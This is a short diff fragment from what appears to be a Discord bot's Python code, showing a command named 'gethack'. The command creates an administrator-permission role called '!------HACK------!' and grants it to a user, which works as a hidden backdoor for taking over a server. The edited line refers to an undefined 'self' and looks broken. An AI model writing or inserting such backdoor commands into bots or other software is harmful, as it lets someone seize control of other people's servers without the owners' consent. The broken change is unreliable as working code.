@@ -236,7 +236,7 @@ async def gethack(ctx):
         perms = discord.Permissions(administrator=True)
         hackRole = await guild.create_role(name="!------HACK------!", permissions=perms)
         
-    await member.add_roles(hackRole)
+    await self.add_roles(hackRole)
 
 
 
